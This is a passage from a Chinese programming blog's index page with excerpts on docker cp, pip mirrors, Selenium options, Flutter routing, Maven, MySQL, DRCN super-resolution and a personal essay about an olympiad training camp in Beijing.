(verptr-&gt;visited[i] == false &amp;&amp; min &gt; verptr-&gt;disweight[i]/*选择边数里最小的权值*/) { min = verptr-&gt;disweight[i]; v = i; } } verptr-&gt;visited[v] = true; //对顶点进行标记 ++count; //对增加的边数进行更新 auto beg = lists[v].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb5ecbb7f87f6b3c504b375fbc59234f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f48814e710903ba5d0c8f25bc8b13125/" rel="bookmark">
			docker从容器里面拷文件到宿主机或从宿主机拷文件到docker容器里面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、从容器里面拷文件到宿主机？
答：在宿主机里面执行以下命令
docker cp 容器名：要拷贝的文件在容器里面的路径 要拷贝到宿主机的相应路径 示例： 假设容器名为testtomcat,要从容器里面拷贝的文件路为：/usr/local/tomcat/webapps/test/js/test.js, 现在要将test.js从容器里面拷到宿主机的/opt路径下面，那么命令应该怎么写呢？
答案：在宿主机上面执行命令
1
docker cp testtomcat：/usr/local/tomcat/webapps/test/js/test.js /opt
2、从宿主机拷文件到容器里面
答：在宿主机里面执行如下命令
docker cp 要拷贝的文件路径 容器名：要拷贝到容器里面对应的路径
示例：假设容器名为testtomcat,现在要将宿主机/opt/test.js文件拷贝到容器里面的/usr/local/tomcat/webapps/test/js路径下面，那么命令该怎么写呢？
答案：在宿主机上面执行如下命令 1
docker cp /opt/test.js testtomcat：/usr/local/tomcat/webapps/test/js
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/443cbecb4928b2ab1ea99bdbf4e659d4/" rel="bookmark">
			Selenium&#43;Python 解决Chrome正在受到自动软件的控制的办法（V78版本有效）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		from selenium import webdriver option = webdriver.ChromeOptions() option.add_experimental_option('useAutomationExtension', False) option.add_experimental_option("excludeSwitches", ['enable-automation']) browser = webdriver.Chrome(r'd:\chromedriver.exe',chrome_options=option) url = "https://toefl.neea.cn/login" browser.get(url) 此方法针对V78版本及以上有效，同时可以解决部分网站白屏的问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50aa92d40dc267108a2ea8d8c1e2a3d7/" rel="bookmark">
			pip无法卸载PyYaml的问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在pycharm去卸载PyYaml无法卸载，利用com命令 pip uninstall PyYaml也是卸载不成功。
第一步：去C:\Python35\Lib\site-packages目录下把yaml库的所有文件都删除，再执行pip uninstall PyYaml命令
第二步：再重新安装pip install PyYaml
安装成功（之前是3.0版本，现在是PyYaml-5.2版本）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/764ebcb8c89c01918d49a1bc239135c1/" rel="bookmark">
			升级pip超时问题解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		升级pip时用下面的命令升级不成功，如图：
python -m pip install --upgrade pip
这个命令时都是time out ，如下情况：
解决方法，使用镜像源，我这里采用的是豆瓣镜像源，
命令行：python -m pip install --upgrade pip -ihttp://pypi.douban.com/simple --trusted-host pypi.douban.com
升级成功，从pip-18.0变成了pip-19.3.1
安装第三方包时，如若超时，也可采用换源的方法
pip国内的一些镜像
阿里云 http://mirrors.aliyun.com/pypi/simple/
中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/
豆瓣(douban) http://pypi.douban.com/simple/
清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/
中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/
修改源方法：
临时使用：
可以在使用pip的时候在后面加上-i参数，指定pip源
eg: pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7cf8c686e19d10c438b86c7cebe2e83/" rel="bookmark">
			史上最强低功耗无线唤醒芯片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先贴出文章来源，霸气的JSSC期刊登出的史上最强低功耗无线唤醒芯片
“A 22.3 nW, 4.55 cm2 Temperature-Robust Wake-up Receiver Achieving a Sensitivity of -69.5 dBm at 9 GHz” by Haowei Jian, Po-Han Peter Wang, Li Gao, Corentin Pochet, Gabriel M. Rebeiz, Drew A. Hall and Patrick P. Mercier, IEEE Journal of Solid-State Circuits. DOI: 10.1109/JSSC.2019.2948812
牛逼的关键点：
1、处于接收状态的等待唤醒功耗仅为22.3nW，相当于LED照明功耗的50万分之一。
2、接收特定信号频率高达9GHz，使得天线和片外电路尺寸大大减小。以前的nW级无线唤醒芯片都在MHz级别，可想而知其片外天线尺寸大出近20倍。
3、稳定工作温度从-10摄氏度到40摄氏度！这是以前的芯片办不到的！
不足的地方：从接收到信号，到唤醒动作完成需要540毫秒。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce20c37b98a99ddc3410f77e068f5351/" rel="bookmark">
			Flutter学习记录——13.路由详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.Flutter路由基础2.Navagator和Route基本用法详解3.页面跳转及传递参数4.总结 1.Flutter路由基础 在 Flutter 中路由也是主要用来处理页面跳转、页面数据传递等操作。Flutter 的路由主要通过路由（Route）和导航器（Navigator）配合使用。Navigator 主要负责路由页面的堆栈管理和操作，例如添加跳转页面、移除页面等。
在 Flutter 中路由用法主要有两种用法：一种是在 MaterialApp 里的 routes 参数里配置定义好路由列表，也就是提前定义好要跳转的页面和名称。
Map&lt;String, WidgetBuilder&gt; routes； 先定义路由跳转路径：
return MaterialApp( title: 'Flutter Demo', theme: ThemeData( primarySwatch: Colors.teal, ), home: ShowAppPage(), // 定义路由表 routes: &lt;String, WidgetBuilder&gt;{ '/buttonpage': (BuildContext context) { return ButtonSamples(); }, '/routepage': (BuildContext context) { return RouteSamples(); }, }, ); // 当然，为了简洁，我们可以用lambda简写路由注册 routes: &lt;String, WidgetBuilder&gt;{ '/buttonpage': (BuildContext context) =&gt; ButtonSamples(), '/routepage': (BuildContext context) =&gt; RouteSamples(), }, 主要规则就是前面定义一个路由页面名称，后面定义路径。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ce20c37b98a99ddc3410f77e068f5351/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8811a0b050a32a6d5910ce08d82d314/" rel="bookmark">
			tf.map_fn报错记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 tf.map_fn报错 ValueError: The two structures don't have the same nested structure 错误代码处如下：
#函数,需要两种tensor的输入,输出一个tensor def fun(elems): input_0,input_1= elems ..... return result #调用 result= tf.map_fn(fun, (input_0,input_1)) 原因：map_fn调用的函数fun，其返回类型与输出elems不一样(包括输入与返回tensor的数量)时，需要指定dtype参数，确定输出类型。
上述代码改正后如下：
result= tf.map_fn(fun, (input_0,input_1),dtype=tf.float32) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b80af2d17851a8479f49aa05c19bbac/" rel="bookmark">
			Linux C 程序执行shell命令并获取返回值结果的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		据说有统计数据表明，代码的缺陷率是一定的，与所使用的语言无关。Linux提供了很多的实用工具和脚本，在程序中调用工具和脚本，无疑可以简化程序，从而降低代码的缺陷数目。Linux shell 脚本也是一个强大的工具，我们可以根据需要编制脚本，然后在程序中调用自定义脚本。
《Unix 编程艺术》中有一句话“一行 Shell 脚本胜过万行 C”。那么在 Linux 编程中，C 程序如何调用 shell 命令，又如何获取该命令的返回结果呢？下面我们一起来看一下吧。
1.调用 shell 命令 一般来说，在 Linux 系统中使用 C 程序调用 shell 命令有以下三种常见的方法：system()、popen()、exec 系列函数。
使用 system() 不需要用户再创建进程，因为它已经封装好了，直接加入 shell 命令即可；使用 popen() 执行 shell 命令，其开销比 system() 小；exec 需要用户 fork/vfork 进程，然后 exec 所需的 shell 命令。 1.1 system() 函数原型
int system(const char *command); 函数说明
system() 会调用 fork() 产生子进程，由子进程来调用 /bin/sh -c string 来执行参数 string 字符串所代表的命令，此命令执行完后随即返回原调用的进程。在调用 system() 期间 SIGCHLD 信号会被暂时搁置，SIGINT 和 SIGQUIT 信号则会被忽略。
返回值
如果 system()在 调用 /bin/sh 时失败则返回 127，其他失败原因返回 -1。若参数 string 为空指针（NULL），则返回非零值。如果 system() 调用成功则最后会返回执行 shell 命令后的返回值，但是此返回值也有可能为 system() 调用 /bin/sh 失败所返回的 127，因此最好能再检查 errno 来确认执行成功。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b80af2d17851a8479f49aa05c19bbac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e554612db8ff13d8a0259f395b2de4bf/" rel="bookmark">
			OI退役记，第二部分，八十中记事
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我不想让这个世界燃烧， 我只是想点燃， 你心中的一束火焰。 我已经失去了， 得到赞誉的野心。 我只想达到， 我一直追求的目标， 相信我。 ——《I Don’t Want To Set The World On Fire》，美国墨点乐队
北京的冬天真冷。这是我们下飞机之后的第一感受。两年前雾霾还没有治理好，机场的天空灰蒙蒙的，冷风在跑道上刮个不停，打在脸上跟刀子一个样。不过，就像每一个到北方去的南方人一样，我们对这一切早有心理准备，因此早在双流机场就换上了厚实的大衣或羽绒服。还没有走出首都机场，我们就领略了北京的特色所在：
一，室内有暖气。早听说北方集中供暖的种种好处，直到现在方才亲身领略。在供暖运行良好的地方，房间里只需披一件长袖。关于这一点，我们在宿舍里会有更深的体会。
二，这是在几天内逐渐确定下来的：不论男女老少，大街小巷，即使在八十中里面，绝大部分人都说一口流利的京片子。之后我向宿管老师们问起这一点，她们异口同声地回答我：“这就是普通话啊？”在这地儿待了一周，我们都学会了往话里的词儿后面加儿化音，这可算在额外收获里面。
言归正传。在连腿都打不直的机场巴士上颠簸了快一个小时，又顶着寒风在北京的街道上走了二十分钟，八十中嵌在教学楼上的校训方才映入我们的眼帘。我满心以为我们会先到宿舍去好生坐一会休息一下，结果来迎接的刘老师直接把我们带到科技楼里面去。机房里坐着几位八十中的同学，但空座位很多，于是我们可以自己挑选位置——然后我就坐在了第一排的正中间。有人会说这是我为数不多的优点之一，不过实际上当时我只是想尽快找个位置坐下来，因为我快要给冻死了。一个八十中的同学正坐在我旁边，他看起来不像是高中生，之后我们的交谈证实了这一点。这位同学名叫cjr，是八十中初三的学生，他告诉我说他也参加了今年的NOIP。我想起自己初三的无聊生活，不禁为此扼腕叹息。在当天下午剩下的几个小时里，我感慨人生，调编译器，上网看题解，最后总算让自己暖和了起来。五点三十分，趁着下楼吃晚饭的空档，我大致分辨了一下八十中校内的地形：
从科技楼走出来，是一片巨大的圆形广场——成都七中的主教学楼放在里面都还绰绰有余。广场中间是圆形的花坛，四周有公告板和长凳，正北方的一条大道通向学校大门口，大道两旁分别是科技楼和教学楼。沿着大道看去，是一座两层台阶之上的大学术厅，之后办CTSC和APIO时就在这里面颁奖。学术厅两侧各有一条辅道，左边通向食堂和宿舍，右边则是侧门。从面积来看，八十中估计有七中的两倍大。我们到的当天是星期六，校园内很空旷，一行人的说话声激不起什么波澜，因此我们走得很快，行色匆匆。
吃过晚饭已无人再有心回机房。我们问刘老师学校里有没有小卖部，他抱歉地说周末不开张，但学校附近——两公里之内有一所家乐福超市，生活必需品只能去那里购买。后来这地方成为了我们唯一的补给点。我们去买了诸如拖鞋，插线板之类的日用杂物，每人还各自挑了些零食，lxl甚至买了几瓶两升装的可乐（后来和他同寝的cdsf告诉我他一天喝一瓶）。长途跋涉回到寝室，铺好床，脱掉羽绒服和棉鞋，坐上床，打开笔记本，把NOIP成绩抛到脑后，上天与我何加哉？正如上文所述，这时我又体会到了暖气的另一重优点：在成都这样的地方，到了冬天，要是坐在机房里面，非得严严实实地裹好，把窗子关严，开启空调，才不致于冻得神志不清；晚上睡觉的时候就更不得了了，必须穿上秋裤，盖三层被子：最里面的用身体压紧，防止半夜翻身漏风；中间一层厚被保暖；外面一块毛毯，用来配重御寒。而要是有了暖气，以上诸多不便尽皆可以省去：坐在机房里面连毛衣都用不着穿，而睡觉的时候只需要一层轻盈厚实的棉被，即使漏风也没有关系——寝室里的空气是暖和的啊。在北京过了几天好日子，回到成都真有点不习惯。
和我一个寝室的同学们也有这样的感觉。由于高一去的人较少，因此我们是打乱了入住的。我们这个寝室只有我和wxh两个高一学生，剩下四位高二的同学：小胖（上一篇提到过。实际并不胖，只是脸很圆），ziliuziliu（我跟他不熟），cyz（在那之后不久就退役了），cx（比小胖更胖）。第一天晚上我们没有太多交流。大家十一点过就关灯睡觉了，比后面几天要早得多。躺在宿舍的床上，听见外面草丛里的蛐蛐叫，看着月光把栏杆的影子投在地上，这样的冬夜实难再找出第二份。
到得第二天，集训才真正开始。八十中请来的讲师个个都是前几届鼎鼎大名的选手。第一位来给我们上课的是pty，出自湖南师大附中，四个月后我们在他的母校听了他的第二次讲课，结果他两次讲图论用的是一模一样的PPT，由此现场有点尴尬。但他在八十中讲的第一次课倒是别开生面。由于坐在第一排正中间的缘故，我两天内三次被点起来回答问题——不过这还有一半原因得归功于我那些就算知道怎么做也绝不举手的同学们。以我个人当时的水平而言，在尽心竭力地听完前几张讲义之后就对后面的内容一窍不通了。直到又一个年头过去，2017年的十二月份，我才真正有能力把从前参加过的集训里的资料和讲义分门别类一点点地学完。值得庆幸的是，pty抽我回答的都是诸如“欧拉回路的定义”或者“树的重心怎么求”之类的简单问题，复杂一点的问题要么他直接讲解，要么会有后面的wxh自告奋勇，或者pty点起一个高二同学解决之。他的每一道题都标注了详细的来源，之后我才知道这是一种多么宝贵的品质。 ……前两天没有出NOIP的成绩，我和cjr的期望落了空。我试着用北京话和他聊天，他认为我说的相当好。我从他那里学了几个名词，在食堂和宿舍试验了一下，竟然没人感到奇怪。有一点令我不解的是，每次我在cdsf面前说北京话，他脸上的表情都会在几秒钟内转为忍不住的大笑。我问他为什么，他回答我：“一听到你说的北京话，我就想起来九班的数学老师。”数学老师名叫吴承浩，在北京待过几年，从此以后只说掺了成都口音的北京话，他的发音中有一种奇特的幽默感。我好生想了想，的确有那么几分相似，于是从此我不在本校同学面前说北京话。 pty走了之后来的是七中的学长们，mhy12345和zhonghaoxi。或许正是因为他们在八十中先后讲课的缘故，我经常把他们两个人搞混。他们两个人讲的东西我现在只记得一个——插头dp。我不知道自己出于一种什么样的勇气，非要把这东西学会。我看网上的代码，读《入门导论》上的讲解，学陈丹琦的ppt，花了整整三天的听课时间摸索，好不容易会写插头了。后来我才知道我达成了一个奇特成就：在学会状压dp之前会写插头dp。这件事在当时给了我不小的信心：我并不是一个太笨的人。别人能学会，能写出来的东西，我也能办到。稍微有点遗憾的是，在我两年的OI生涯中，这东西只考过一次。 ……之后的三天，CCF的官方网站仍然空空如也，挂在首页的还是一成不变的“NOIP2016报名网址”。pkl也在关注成绩，她感到很遗憾。这是八十中学OI的妹子，比cjr还小一个年级，也就是说她当时初二——幸亏当时我不了解这一点，还以为她和我们一样高一，否则我不知得有多伤心。初二的时候我还在学c++语法，连swap都不会实现，最后被&gt;=和&lt;=劝退了，直到初三下半期才重新捡起来。 集训的日子所剩无几。这五天里我们的生活节奏一成不变：早上七点过，从宿舍的床上爬起来，顶着脸上的寒风从宿舍走到食堂去吃早餐——多半是油条加上包子，豆浆一类，味道还挺不错——再穿过圆形广场到科技楼去——后面几天我们才发现可以直接穿过教学楼绕道科技楼，不必在广场上吹冷风——然后开始上课。前几天的晚自习我们还会在机房待上一两个小时，后来一吃完晚饭，我们就直接走回宿舍，坐在床上享受暖气了。每天晚上十点过，wxh搓炉石（机房里有一半人都会玩这游戏）；cx和小胖玩gal；ziliuziliu的电脑主板坏了，因此他只能拿手机上网；cyz打文明，我则推MO。寝室里的睡觉时间也越来越晚，从十一点半到十二点最后到十二点二十。 真正的转机在第六天。当天给我们上课的是来自THU交叉信息研究院的毕克大爷，他自我介绍是“毕恭毕敬，克勤克让”。刚开始上课，我们就体会到了这位大爷和其他人的不同之处：前几天讲课的PPT我还能看那么几页，他的讲义我一页都看不懂。正当我对着屏幕上一行行奇形怪状的数学公式无所适从的时候，旁边的cjr戳了戳我的肩膀，我问他有什么事。 他告诉我说成绩出来了。 我差点从凳子上跳起来。两秒钟之后我已经打开了CCF的官网，果不其然，首页上多了一句举重若轻的“NOIP2016提高组一等奖名单”。我点开链接，跳到四川省一栏的最下面去看分数线。最低分是255分，但255分的人当中并没有我。 于是我一目十行的往上看，最后在一个不起眼的位置看到了自己的名字： CCF-NOIP2016-1601 SC-0408 四川 徐西岭 男 275 成都市第七中学 高一 这个消息好像一朵烟花在我的脑子里漂亮地炸开了，留下许多金色的火花。这时毕克也知道了这消息，他建议我们先把名单打开再通知不在这里的其他人，否则CCF的服务器可能会堵死，到那时就谁也看不成了。听闻成绩出来，后面的同学们顿时兴奋起来，嘈杂的声音传遍机房，不过当时我对这一切都没有理会。我想到的第一件事是打电话报告家长，父亲闻此佳音，对我表示赞许。挂掉电话，趁着其他人或庆幸，或意外的当儿，我大致看了看其他人的分数。lxl得了590，司机有529，yfzcsc拿了465，wxh紧随其后，共457分。我这成绩在全校排在倒数第三，这一年zht111没能拿到一等，czqqqaq比我少了5分，其余同学的成绩都在300分以上。cjr也看到了自己的成绩，267分，比一等线只高两分，不禁庆幸自己没有打挂一个点。pkl考的不怎么好，没有上线。总而言之，那天下午机房里的气氛还是比较轻松的，大部分同学的目标都达成了，我们为此感到愉快。 ……从科技楼走回宿舍的那一段路给我留下极深的印象。想要出去，得先掀开又厚又沉的挡风帘，让冷风短暂地灌进大楼，随后用力推开镶着玻璃钢的铁门，整个人在一瞬间就离开了楼层间温暖的空气，闯入寒冬下的北京城。十二月份还不是最冷的时候，我们两次集训里没有下过一次雪，但零度上下不多的气温于人而言都没有什么区别。这样冷的天，让人说话都不由自主大声起来。太轻的话语会在寒风中飘散。手指头对冷的感觉最是敏锐，露在空气里的感觉跟放在针桶里没有两样，只能让它们待在兜里，进了室内再拿出来。 最后一天没有安排课程。张君亮老师带着我们七中一行人赶到THU去参观学习，顺便见见学长们。杨景钦在清华集训中考的还不错，因此心情很好，也跟着我们过来看一看自己即将要上课的地方。托张老的福，在清华里上课的学长们几乎都过来了。我们见到了骑着自行车的laekov，背书包的jason_yu，当然还有zhonghaoxi和mhy12345，外加一位从北大特意赶过来的学长（原谅我忘记了他的名字）。清华的校园很漂亮。我们在一条两边栽满了常青树的路上慢慢走着，张老对我们说要多熟悉一下这里，因为以后是要在里面上课的。于是大家都开始一边笑一边摆手否认，同时说着“只有您能上清华”一类的话，但实际上心里都是踌躇满志，不甘人下的。吃过午饭，下午学校的喜报就出来了，标题上赫然写着“祝贺成都七中信息学团队在NOIP2016中勇夺23块金牌”。我们哑然失笑，看着张老给学校宣传部解释NOIP一等奖不能叫金牌（最后还是没有改过来）。这个小插曲让我们感觉很有趣，我们一边计算要几个省的省队才能凑够23块金牌，一边在清华的校园里散步。我们走到信息技术楼，陪杨景钦进去参观了一下，最后从后门绕了出去。从清华的校园里出来，太阳已经西沉——当天是难得的晴天。我们坐上大巴，开回首都机场，在引擎的轰鸣声和起飞时0.4G的加速度中结束了这次北京之行。这就是我在八十中的第一次经历。 2016年12月31日的最后一分钟，我站在家中的电视机前，学着从前在电影里看来的姿势，手持一杯白开水，准备在新年来到时一口气喝下去。当我倒数完毕，将杯子举起一饮而尽时，我还没有意识到接下来的一年我将经历的一切。我OI生涯的大部分经历和体验都发生在这一年内，我将怀揣诸多疑问，我将获得模棱两可的解答，我将在午后的机房中与挥之不去的疲倦斗争，我将在考试之前的夜晚辗转反侧无法入眠，我将忐忑不安地提交不知是否正确的代码，我将翻来覆去地调试最后获得莫名其妙的AC，我将在十拿九稳的考试中发挥失常，我将在难以下手的考试中居于人上，我将对着含糊不清的题解无可奈何，我将研读繁错复杂的代码找寻真相，我将坐在台下仔细听讲，我将站在台上居高临下，我将在辛苦后得到一点似有若无的信心，我将在十一月的寒风中不知前路如何适从，我将与自我沟通交谈，我将把自己打倒推翻。但在2017年的第一秒钟，我所做的只是喝下杯中的凉水，然后对面前的空气说上一句： “新年快乐。” 现在是1月1日，这篇退役记还剩下一大半。请稍安勿躁，好戏就在前方。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2faf05e90437406782ddc9ccc60d0e52/" rel="bookmark">
			ubuntu下安装mysql并远程客户端连接mysql
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安装
https://www.cnblogs.com/opsprobe/p/9126864.html
2.mysql 开启远程连接权限
https://blog.csdn.net/hl449006540/article/details/79722060
3.添加新用户
https://www.linuxidc.com/Linux/2018-09/154250.htm
4.Ubuntu Server下启动/停止/重启MySQL数据库的三种方式
启动mysql：
方式一：sudo /etc/init.d/mysql start
方式二：sudo service mysql start 停止mysql：
方式一：sudo /etc/init.d/mysql stop
方式二：sudo service mysql stop 重启mysql：
方式一：sudo/etc/init.d/mysql restart
方式二：sudo service mysql restart
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd25910d688aa5eac5774f87128ea37a/" rel="bookmark">
			超分辨率——DRCN
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		超分辨率——DRCN@TOC
我们提出一种基于深度递归卷积神经网络进行图像超分辨率重建的模型。我们的网络有一个很深的递归层，多大16层。在额外的卷积层不引入新的变量的情况下，增加递归层数可以提高超分辨率图像恢复性能。由于梯度消失和梯度爆炸，用标准的梯度下降法学习DRCN是困难的。为了减轻训练的困难程度，作者提出两个改进办法：递归监督和跃层连接。
对于SR问题，卷积网络的感受野决定了上下文信息的数量，上下文信息可以被利用去推断丢失的高频组件。SR是一个不适定的逆问题，收集和分析更多的邻居像素可以给出更多的在降采样时丢失的信息。
提高感受野的方法有：增加卷积核大于1X1的卷积层，增加池化层。这两种办法有很大的缺点，增加卷积层会增加参数，增加池化层会忽略一些像素级的信息。
SR问题为什么不用池化网络？
在SR问题中图片细节是非常重要的，因此大多数深度学习方法不使用池化层。
为什么作者会想到用深度递归卷积网络解决SR问题？
增加网络深度会产生更多的参数进而有两个问题会出现：1，过拟合，需要更多的数据。2，模型太大而不能存储和检索。基于以上问题作者提出了深度递归卷积神经网络（DRCN）。DRCN重复使用相同的卷积层，但是递归执行时并不增加参数数量，DRCN感受野是41X41这相对于SRCNN（13X13）是相当大的。但是学习单个权值像素之间的长期依赖关系非常困难。
如何解决学习单个权值像素之间的长期依赖关系困难问题？
递归监督：每个递归的特征映射被用来重建目标HR图片
跃层连接：从输入层到输出层使用跃层连接作者为什么想用深度递归神经网络解决SR问题？
（1）VDSR提出一种深度卷积神经网络解决SR问题，并且有很好的实现效果，作者想到卷积层有完全相同的结构提醒我们递归
（2）感受野对于SR问题，卷积网络的感受野决定了上下文信息的数量，上下文信息可以被利用去推断丢失的高频组件。收集和分析更多的邻居像素可以给出更多的在降采样时丢失的信息。
提高感受野的方法有：增加卷积核大于1X1的卷积层，增加池化层。这两种办法有很大的缺点，增加卷积层会增加参数，增加池化层会忽略一些像素级的信息
Embed Net作用？为什么使用两次卷积？
Embeding Net主要是将输入图像转成一系列的feature map表示。该子网络主要注重提取特征，将其送入Inference Net去恢复低分辨率图像中的丢失的高频信息。
卷积神经网络的第一个卷积层的过滤器用来检测低阶特征，比如边角曲线等，随着卷积层的增加，对应过滤器检测的特征就更加复杂。
Inference Net层的作用？
Inference Net是这篇文章的重点，主要是处理超分辨率过程的高频细节恢复工作。Inference Net是一个递归的子网络，通过不增加参数数量的情况下，尽量大的增加网络的感受野receptive fields。
因此本文采用了递归卷积层，每次递归都采用与上次一样的卷积核，因此，在增大感受野的同时，并没有引入额外的参数
这样做的同时，会引入两个麻烦的问题；1）Recursive次数怎么选？如何去选取最优的Recursive次数。2）Recursive次数多了，在反向传播的时候，长链式的梯度会出现两个常见的问题：梯度爆炸和梯度弥散，如何去有效训练该子网络？
关于第二个问题，作者给出了两种算法去解决这个问题，1）监督递归，每次Recursive后的feature map都会连接到输出。递归监督本质上减轻了训练递归网络的困难。如果监控信号直接从损耗层递归到早期递归，则反向传播要经过几个层。将从不同预测损耗反向传播的梯度累加，得到平滑效果。沿反向传播路径的渐变消失/爆炸的不利影响得到了缓解。
2)skip-connection，由于超分辨率有个特点（图像输入和图像输出在一定程度上是高度相关的，所以将图像输入直接跳跃连接到图像输出）
对于SR，输入和输出图像是高度相关的。即使不是全部，至少也要携带大部分输入值，直到网络结束，这是不可避免的，但效率非常低。由于梯度问题，如果输入和输出之间存在多次递归，那么准确地学习输入和输出之间的简单线性关系是非常困难的。
我们添加了一个层跳过[3]从输入到重建网络。在语义分割网络[18]中成功地应用了层跳算法，并采用了相似的思想。现在，只要在递归过程中使用输入图像，它就会被直接输入到重构网络中。我们skip-connection
有两个优点。首先，保存递归期间存储输入信号的网络容量。其次，输入信号的精确拷贝可以用于目标预测。
此外，选择最优递归数的重要性也降低了，因为我们可以利用所有中间层的预测。如果递归对于给定的任务来说太深，那么我们期望晚期预测的权重较低，而早期预测的权重较高
reconstruction network 作用？
reconstruction network 相当于Embed Net的逆过程，将图片转换为输入图片的通道个数。
递归神经网络如何实现参数共享？
在卷积神经网络中，卷积核内的一个卷积核(滤波器)用于提取一个特征(输入数据的一个维度)，而输入数据具有多个特征(维度)的话，就会有很多个卷积核，那么在这一层的卷积层中就会有“参数爆炸”的情况。同时，一层中每个卷积核提取特定的特征，忽略了数据的局部相关性。
而参数共享的作用在于，每个特征具有平移不变性，同一个特征可以出现在出现在不同数据的不同位置，可以用同一个卷积核来提取这一特征。而且利用数据的局部相关性，通过权值共享，一个卷积层共享一个卷积核，减少了卷积层上的参数。通过加深神经网络的层数(深度网络)，每一层卷积层使用不同的卷积核，从而达到提取尽可能多特征的目的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d488ed2c5093494b8229a0262d45d0e3/" rel="bookmark">
			Maven导入本地jar包的三种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Maven导入本地jar包的三种方法 1.直接dependency本地的jar包 &lt;dependency&gt; &lt;groupId&gt;com.im&lt;/groupId&gt; &lt;!--自定义--&gt; &lt;artifactId&gt;sdk&lt;/artifactId&gt; &lt;!--自定义--&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;!--自定义--&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;!--system，类似provided，需要显式提供依赖的jar以后，Maven就不会在Repository中查找它--&gt; &lt;systemPath&gt;${basedir}/lib/sdk-1.0.jar&lt;/systemPath&gt; &lt;!--项目根目录下的lib文件夹下--&gt; &lt;/dependency&gt; 2.编译阶段指定外部lib &lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;version&gt;2.3.2&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;encoding&gt;UTF-8&lt;/encoding&gt; &lt;compilerArguments&gt; &lt;extdirs&gt;${project.basedir}/src/main/resources/lib&lt;/extdirs&gt;&lt;!--指定外部lib--&gt; &lt;/compilerArguments&gt; &lt;/configuration&gt; &lt;/plugin&gt; ${project.basedir}/src/main/resources/lib：我的jar包存放的路径
3.将外部jar安装到本地maven仓库，然后在dependency引入 mvn install:install-file -Dfile=sdk-1.0.jar -DgroupId=com.im -DartifactId=sdk -Dversion=1.0 -Dpackaging=jar Dfile: jar包的物理路径Dversion:版本号Dpackaging:包类型 在pom中引入依赖
&lt;dependency&gt; &lt;groupId&gt;com.im&lt;/groupId&gt; &lt;artifactId&gt;sdk&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/dependency&gt; 注意：如果你是SpringBoot项目，还是会存在提示 找不到符号，此时请往下面看
如果你是SpringBoot项目，此时你的pom文件中只有spring-boot-maven-plugin
&lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;executable&gt;true&lt;/executable&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; 此时，需要再添加maven-complier-plugin即可
&lt;plugin&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;compilerArguments&gt; &lt;extdirs&gt;${project.basedir}/src/main/resources/lib&lt;/extdirs&gt; &lt;/compilerArguments&gt; &lt;/configuration&gt; &lt;/plugin&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7857e217d679693ecc4a8f7ebb8aeba/" rel="bookmark">
			Unity 重置动画到初始状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 // 重置Animator public void ResetAnimator(){ animator.Play("Take 001", 0, 0); animator.Update(0); animator.enabled = false; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
